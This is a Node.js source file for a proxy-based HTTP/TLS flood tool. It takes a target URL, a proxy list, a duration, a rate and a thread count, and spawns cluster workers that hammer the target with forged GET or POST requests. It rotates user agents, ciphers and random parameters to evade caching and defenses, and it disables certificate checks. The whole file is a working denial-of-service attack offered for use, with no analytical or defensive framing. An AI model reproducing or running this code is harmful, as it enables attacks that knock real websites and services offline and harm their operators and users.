//npm install randomstring
//npm install colors set-cookie-parser
process.on('uncaughtException', function (er) {
  //console.error(er)
});
process.on('unhandledRejection', function (er) {
  //console.error(er)
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randstr = require('randomstring')
const url = require('url');

var path = require("path");
const cluster = require('cluster');

function ra() {
  const rsdat = randstr.generate({
    "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
    "length": 4
  });
  return rsdat;
}

let headerbuilders;

let COOKIES = undefined;
let POSTDATA = undefined;

var fileName = __filename;
var file = path.basename(fileName);
let randomparam = false;

if (process.argv.length < 8) {
  console.log('-> GET/POST website proxy.txt time rate(16) threads(4) | - WITH POST HTTP REQUEST: cookie="" postdata="" randomstring="" headerdata="") :3');
  process.exit(0);
}
const proxyCount = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n').length;
console.log(`目标: ${process.argv[3]}`);
console.log(`方法: ${process.argv[2]}`);
console.log(`时间: ${process.argv[5]} seconds`);
console.log(`线程: ${process.argv[7]}`);
console.log(`速率: ${process.argv[6]}`);
console.log(`Proxy Count: ${proxyCount}`);
process.argv.forEach((ss) => {
  if (ss.includes("cookie=")) {
    COOKIES = ss.slice(7);
  } else if (ss.includes("postdata=")) {
    if (process.argv[2].toUpperCase() != "POST") {
      console.error("Method Invalid (Has Postdata But Not POST Method)")
      process.exit(1);
    }
    POSTDATA = ss.slice(9);
  } else if (ss.includes("randomstring=")) {
    randomparam = ss.slice(13);
    console.log("(!) Custom RandomString");
  } else if (ss.includes("headerdata=")) {
    headerbuilders = "";
    const hddata = ss.slice(11).split('""')[0].split("&");
    for (let i = 0; i < hddata.length; i++) {
      const head = hddata[i].split("=")[0];
      const dat = hddata[i].split("=")[1];
      headerbuilders += `\r\n${head}: ${dat}`
    }
  }
});
if (COOKIES !== undefined) {
  console.log("(!) Custom Cookie Mode");
} else {
  COOKIES = ""
}
if (headerbuilders !== undefined) {
  console.log("(!) Custom HeaderData Mode");
}
if (POSTDATA !== undefined) {
  console.log("(!) Custom PostData Mode");
} else {
  POSTDATA = ""
}

if (cluster.isMaster) {
  const numThreads = parseInt(process.argv[7]);
  const workers = new Set();

  console.log(`Starting ${numThreads} worker threads...`);

  
  for (let i = 0; i < numThreads; i++) {
    const worker = cluster.fork();
    workers.add(worker);
    console.log(`Worker ${worker.process.pid} started`);
  }

  
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died. Signal: ${signal}. Starting new worker...`);
    workers.delete(worker);

    
    if (workers.size < numThreads) {
     
      const newWorker = cluster.fork();
      workers.add(newWorker);
      console.log(`New worker ${newWorker.process.pid} started. Current workers: ${workers.size}`);
    }
  });

  
  cluster.on('error', (error) => {
    console.error(`Cluster error: ${error}`);
  });

  
  setTimeout(() => {
    console.log('Attack completed. Shutting down...');
    
    for (let worker of workers) {
      worker.kill();
    }
    
    process.exit(1);
  }, process.argv[5] * 1000);

} else {
  startflood();
}

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

var parsed = url.parse(target);
process.setMaxListeners(0);

const cplist = [
  "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
  "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384",
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

var UAs = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');

function getTlsOptions(host, cipper, socket) {
  return {
    host: host,
    ciphers: cipper,
    secureProtocol: 'TLS_method',
    servername: host,
    secure: true,
    rejectUnauthorized: false,
    socket: socket,

    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: 50000,
    maxFreeSockets: 25000,
    timeout: 10000,

    requestCert: false,
    noDelay: true,
    decompress: false,
    scheduling: 'lifo',

    maxPacketSize: 32768, 
    highWaterMark: 32768,
    maxHeaderSize: 131072,

    sessionTimeout: 5000,
    honorCipherOrder: true,
    ecdhCurve: 'auto',

    maxConcurrentStreams: 10000,
    initialWindowSize: 31457280, 
    maxSessionMemory: 64000,
    maxFrameSize: 32768,
    
    enablePush: false,
    requestOCSP: false,
    enableOCSPStapling: false,
    enableCompression: false,

    handshakeTimeout: 10000,
    retryDelay: 100,
    maxRetries: 5,

    maxTotalSockets: 50000,
    maxCachedSessions: 1000,
    sessionTimeout: 5000
  };
}

function startflood() {
  if (process.argv[2].toUpperCase() == "POST") {
    if (randomparam) {
      setInterval(() => {

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        var http = require('http'),
          tls = require('tls');

        var req = http.request({
          host: proxy[0],
          port: proxy[1],
          ciphers: cipper,
          method: 'CONNECT',
          path: parsed.host + ":443",
          timeout: 1000,

          keepAlive: true,
          keepAliveMsecs: 1000,
          maxSockets: 5000,
          maxFreeSockets: 2500,
          scheduling: 'fifo',
          agent: false,

          setHost: false,
          decompress: false,
          sessionTimeout: 1000,

          headers: {
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=10, max=5000'
          },

          connectTimeout: 500,
          maxHeaderSize: 32768,
          highWaterMark: 32768,
          writableHighWaterMark: 32768,




          maxPacketSize: 8192,
          maxCachedSessions: 500,
          
          tcpNoDelay: true,
          requestTimeout: 1000,
          autoSelectFamily: false,

          maxTotalSockets: 10000,
          maxSockets: Infinity,
          socketTimeout: 1000
        }, (err) => {
          req.end();
          return;
        });

        req.on('connect', function (res, socket, head) {
          var tlsConnection = tls.connect(
            getTlsOptions(parsed.host, cipper, socket),
            function () {
              for (let j = 0; j < rate * 50; j++) {
                tlsConnection.write("POST" + ' ' + `${parsed.path.replace("%RAND%", ra())}?${randomparam}=${randstr.generate({ length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789" })}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%", ra()) : ""}` + '\r\n\r\n');
              }
              // tlsConnection.end();
              // tlsConnection.destroy();
            });

          tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
          });
          tlsConnection.on('data', function (data) {
            return;
          });

        });
        req.end();
      });
    } else {
      setInterval(() => {

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        var http = require('http'),
          tls = require('tls');

        var req = http.request({
          host: proxy[0],
          port: proxy[1],
          ciphers: cipper,
          method: 'CONNECT',
          path: parsed.host + ":443",
          timeout: 1000,

   
          keepAlive: true,
          keepAliveMsecs: 1000,
          maxSockets: 5000,
          maxFreeSockets: 2500,
          scheduling: 'fifo',
          agent: false,

      
          setHost: false,
          decompress: false,
          sessionTimeout: 1000,

     
          headers: {
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=10, max=5000'
          },

          
          connectTimeout: 500,
          maxHeaderSize: 32768,
          highWaterMark: 32768,
          writableHighWaterMark: 32768,


        
          maxPacketSize: 8192,
          maxCachedSessions: 500,

         
          tcpNoDelay: true,
          requestTimeout: 1000,
          autoSelectFamily: false,

    
          maxTotalSockets: 10000,
          maxSockets: Infinity,
          socketTimeout: 1000
        }, (err) => {
          req.end();
          return;
        });

        req.on('connect', function (res, socket, head) {
          var tlsConnection = tls.connect(
            getTlsOptions(parsed.host, cipper, socket),
            function () {
              for (let j = 0; j < rate * 50; j++) {
                tlsConnection.write("POST" + ' ' + parsed.path.replace("%RAND%", ra()) + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nContent-Type: text/plain' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", ra()) : ""}` + '\r\n\r\n' + `${(POSTDATA !== undefined) ? POSTDATA.replace("%RAND%", ra()) : ""}` + '\r\n\r\n');
              }
        
            
            });

          tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
          });

          tlsConnection.on('data', function (data) {
            return;
          });
        });
        req.end();
      });
    }
  } else if (process.argv[2].toUpperCase() == "GET") {
    if (randomparam) {
      setInterval(() => {

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        var http = require('http'),
          tls = require('tls');

        var req = http.request({
          host: proxy[0],
          port: proxy[1],
          ciphers: cipper,
          method: 'CONNECT',
          path: parsed.host + ":443",
          timeout: 1000,

          
          keepAlive: true,
          keepAliveMsecs: 1000,
          maxSockets: 5000,
          maxFreeSockets: 2500,
          scheduling: 'fifo',
          agent: false,

          
          setHost: false,
          decompress: false,
          sessionTimeout: 1000,

          
          headers: {
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=10, max=5000'
          },

        
          connectTimeout: 500,
          maxHeaderSize: 32768,
          highWaterMark: 32768,
          writableHighWaterMark: 32768,




          
          maxPacketSize: 8192,
          maxCachedSessions: 500,

        
          tcpNoDelay: true,
          requestTimeout: 1000,
          autoSelectFamily: false,

          
          maxTotalSockets: 10000,
          maxSockets: Infinity,
          socketTimeout: 1000
        }, (err) => {
          req.end();
          return;
        });

        req.on('connect', function (res, socket, head) {
          //open raw request
          var tlsConnection = tls.connect(
            getTlsOptions(parsed.host, cipper, socket),
            function () {
              for (let j = 0; j < rate * 50; j++) {
                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%", ra())}?${randomparam}=${randstr.generate({ length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789" })}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: 0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", ra()) : ""}` + '\r\n\r\n');
              }
      
      
            });

          tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
          });
        });
        req.end();
      });
    } else {
      setInterval(() => {

        var cipper = cplist[Math.floor(Math.random() * cplist.length)];

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxy = proxy.split(':');

        var http = require('http'),
          tls = require('tls');

        var req = http.request({
          host: proxy[0],
          port: proxy[1],
          ciphers: cipper,
          method: 'CONNECT',
          path: parsed.host + ":443",
          timeout: 1000,

    
          keepAlive: true,
          keepAliveMsecs: 1000,
          maxSockets: 5000,
          maxFreeSockets: 2500,
          scheduling: 'fifo',
          agent: false,

         
          setHost: false,
          decompress: false,
          sessionTimeout: 1000,

          
          headers: {
            'Connection': 'keep-alive',
            'Keep-Alive': 'timeout=10, max=5000'
          },

    
          connectTimeout: 500,
          maxHeaderSize: 32768,
          highWaterMark: 32768,
          writableHighWaterMark: 32768,




         
          maxPacketSize: 8192,
          maxCachedSessions: 500,

          
          tcpNoDelay: true,
          requestTimeout: 1000,
          autoSelectFamily: false,

          
          maxTotalSockets: 10000,
          maxSockets: Infinity,
          socketTimeout: 1000
        }, (err) => {
          req.end();
          return;
        });

        req.on('connect', function (res, socket, head) {
          var tlsConnection = tls.connect(
            getTlsOptions(parsed.host, cipper, socket),
            function () {
              for (let j = 0; j < rate * 50; j++) {
                tlsConnection.write("GET" + ' ' + `${parsed.path.replace("%RAND%", ra())}` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + COOKIES + '\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: 0\r\nConnection: Keep-Alive' + `${(headerbuilders !== undefined) ? headerbuilders.replace("%RAND%", ra()) : ""}` + '\r\n\r\n');
              }
              // tlsConnection.end();
              // tlsConnection.destroy();
            });

          tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
          });
          tlsConnection.on('data', function (data) {
          });
        });
        req.end();
      });
    }
  }
}
